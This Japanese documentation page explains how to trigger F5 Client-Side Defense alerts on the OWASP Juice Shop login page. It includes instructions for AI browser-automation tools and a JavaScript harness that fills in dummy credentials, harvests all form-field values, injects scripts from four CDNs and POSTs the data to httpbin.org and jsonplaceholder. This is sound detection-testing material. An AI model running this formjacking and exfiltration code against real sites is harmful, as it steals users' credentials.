## 検知のトリガー

CSD はブラウザ内の JavaScript の動作を監視します。WAF や Bot Defense とは異なり、curl コマンドで CSD の検知をトリガーすることはできません — 実際のブラウザ側のスクリプトアクティビティが必要です。以下の統合スクリプトは、1 回の実行で CSD の 3 つの検知シグナルすべてをトリガーします：フォームフィールドの収集、複数の CDN ドメインからのサードパーティスクリプトの注入、および外部エンドポイントへのデータ流出です。

### AI 自動実行

ブラウザ自動化ツール（MCP Chrome DevTools、Playwright、Puppeteer）を備えた AI アシスタントは、上記の手動手順に従う代わりに、プログラムでシミュレーションを実行します：

1. **initScript を使用してナビゲート** — まず `about:blank` に移動してクリーンなドキュメントコンテキストを確保し、次に `navigate_page` でログインページ URL（例：`http://$F5XC_DOMAINNAME/#/login`）に移動します。その際、zone.js がパッチする前にネイティブの `setInterval`、`clearInterval`、`fetch`、`console.log` を保存し、ログインフォームフィールドをポーリングし、ネイティブの `HTMLInputElement.prototype.value` セッターで認証情報を入力し、Combined Detection Script をインラインで即座に実行する `initScript` を使用します。以下の initScript をそのまま使用してください。
2. **ウェルカムバナーを閉じる** — `press_key` で `Escape` を押してウェルカムバナーを閉じます。再訪問時にはバナーが表示されないことがあります（Cookie が保持されるため）
3. **完了を待つ** — すべての CDN スクリプトのロード/エラーコールバックと fetch プロミスの解決が完了するまで 10 秒待ちます
4. **証拠を取得** — `list_console_messages` で `[CSD Demo] Simulation complete` を確認し、`list_network_requests` で `script` と `fetch` タイプにフィルタリングして HTTP ステータスコードを検証します

**initScript ハーネス（そのまま使用 — 自動実行のために Combined Detection Script をラップします）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('input[type="email"]');
  var passEl  = document.querySelector('input[type="password"]');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

**ネイティブ `fetch` に関する注記：** このハーネスは zone.js エラーを回避するために `window.fetch.bind(window)` を保存します。これはすべての攻撃シミュレーションフェーズにおいて正しい動作です。CSD の緩和策はスクリプトのロードをブロックします（`&lt;script&gt;` タグの `src` 値をクリアすることで）が、`fetch()` 呼び出しはブロックしません。そのため、ネイティブの fetch 参照を保存しても緩和策の動作には影響しません。同じ initScript がフェーズ 2 とフェーズ 3 で使用されます。

<Aside type="caution">
**zone.js の非互換性** — Juice Shop は Angular の zone.js を使用しており、`setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest`、およびその他のブラウザ API をパッチします。これにより MCP の `evaluate_script`、`fill`、`click` ツールが `Cannot read properties of undefined (reading 'call')` で失敗します。代わりに `navigate_page` と `initScript` を使用してください — `initScript` は zone.js のロード前に実行されるため、ネイティブ API 参照を保存できます。initScript はネイティブの `HTMLInputElement.prototype.value` セッター（`fill` ツールではなく）を使用してフォームフィールドを入力し、`setInterval` コールバック内で検知スクリプトをインラインで実行する必要があります。
</Aside>

<Aside type="note">
**initScript の蓄積** — `initScript` パラメータを指定した `navigate_page` の各呼び出しは、そのブラウザコンテキストで以降のすべてのドキュメントロード時に実行される永続リストにスクリプトを追加します。古いスクリプトの干渉を避けるために、実行間に `about:blank` に移動するか、クリーンなコンテキストのために `new_page` と `isolatedContext` を使用してください。
</Aside>

ブラウザ自動化ツールを持たないオペレーターは、上記の手動手順を使用してください。

<Aside type="tip">
検知が CSD ダッシュボードに表示されるまで **5〜10 分** かかります。スクリプトの実行後にアラートがまだ表示されていない場合は、[CSD コンソールのウォークスルー](/csd/csd-console/)に進み、後で再確認してください。
</Aside>

### スクリプトの動作内容

統合シミュレーションは CSD の 3 つの検知シグナルすべてをトリガーします：

| 動作 | スクリプトの実行内容 | CSD が検知する内容 |
| --- | --- | --- |
| **フィールド収集** | 既存の `input` 要素（email、password）から値を読み取る | 機密フォームフィールドを読み取るスクリプト — 高リスクとしてフラグ付け |
| **スクリプト注入** | `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` から読み込む 4 つの `<script>` タグを追加する | ページ上の 4 つの新しいサードパーティスクリプトドメイン |
| **データ流出** | 収集したデータを `fetch` で `www.httpbin.org` と `jsonplaceholder.typicode.com` に送信する | 外部ドメインへのネットワーク呼び出し（注：fetch の宛先はスクリプトネットワークインタラクションとして表示され、Network ドメインビューには表示されません） |

<Aside type="note">
CSD には特定の検知境界があります — 例えば、ページロード時の DOM フィールドのみが追跡され、Network ビューにはスクリプトロードドメインのみが表示されます。完全なリストについては[検知の境界](/csd/overview/#detection-boundaries)を参照してください。
</Aside>

### 高度なシミュレーション

上記の統合スクリプトは、ほとんどのデモに適した簡略化された 3 フェーズバージョン（収集、注入、流出）です。[攻撃スクリプトライブラリ](/csd/attack-scripts/)では、攻撃タイプ別に整理された 10 個のターゲットスクリプトを提供しており、統合スクリプトのカバレッジに加えて DOM 操作、Cookie 流出、画像ビーコンチャネルを追加する**最大検知**ストレステストも含まれています。個々のスクリプトを使用して、特定の攻撃カテゴリ（フォームジャッキング、デジタルスキミング、サプライチェーン注入、データ流出、DOM 操作）を個別にデモンストレーションできます。
